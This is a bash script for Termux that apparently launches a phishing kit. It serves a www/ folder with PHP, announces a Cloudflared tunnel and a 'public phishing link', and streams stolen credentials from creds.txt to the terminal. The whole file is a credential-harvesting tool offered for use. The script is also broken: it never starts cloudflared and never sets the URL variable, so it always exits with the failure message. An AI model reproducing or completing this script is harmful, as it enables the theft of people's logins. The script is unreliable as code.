#!/data/data/com.termux/files/usr/bin/bash

# Start PHP server on port 3333
echo "[+] Starting local PHP server on http://localhost:3333..."
php -S 127.0.0.1:3333 -t www/ > /dev/null 2>&1 &

# Wait for server to start
sleep 2

# Start cloudflared tunnel
echo "[+] Starting Cloudflared Tunnel on port 3333..."
IP=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "[+] Access the page at: http://$IP:3333"

if [[ -z "$URL" ]]; then
  echo "[-] Failed to get Cloudflared URL. Make sure cloudflared is installed."
  exit 1
fi

echo -e "\n[+] Public phishing link: \033[1;32m$URL\033[0m"
echo "[*] Waiting for credentials (press CTRL+C to stop)..."
echo

# Live creds output
touch www/creds.txt
tail -f www/creds.txt
